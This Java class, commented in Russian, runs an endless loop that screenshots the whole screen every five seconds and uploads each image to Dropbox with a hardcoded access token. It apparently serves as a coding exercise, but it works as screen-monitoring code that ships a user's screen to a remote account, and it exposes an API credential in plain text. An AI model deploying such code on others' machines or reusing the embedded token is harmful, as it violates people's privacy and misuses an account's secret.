import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MyThread extends Thread {

    @Override
    public void run() {
        for (;;) {                                                  // Цикл неограничен,в дальнейшем возможны различные вариации
            System.out.println("Скрин отправлен в Dropbox");
            try {
                sleep(5000);                                        // каждые 5 секунд
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

            Robot robot = null;
            try {
                robot = new Robot();
            } catch (AWTException e) {
                e.printStackTrace();
            }
            BufferedImage screenShot = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));  // делаем скриншот экрана

            String ACCESS_TOKEN = "vzmen4mMaPAAAAAAAAAAENGwZEzBvHxjxu-xAu_daO314ttdTiAKgvcFEvr8V7CK";  // подключаем Dropbox к idea
            DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
            DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);

            try {
                ByteArrayOutputStream baos = new ByteArrayOutputStream();           // перевод  BufferedImage в InputStream
                ImageIO.write(screenShot, "png", baos);
                InputStream is = new ByteArrayInputStream(baos.toByteArray());

                SimpleDateFormat format = new SimpleDateFormat("yyyyMMdd_HHmmss");           // задаем формат даты и времени
                Date data = new Date();                                                     // опеределяем текущую дату и время
                FileMetadata metadata = client.files().uploadBuilder("/" + format.format(new Date()) + ".png") // закидываем скриншот в Dropbox с названием в виде "ГГГГММЧЧ_ЧЧММСС"
                     .uploadAndFinish(is);
                }
                catch (Exception e){
                    e.printStackTrace();
                }
        }
    }
}
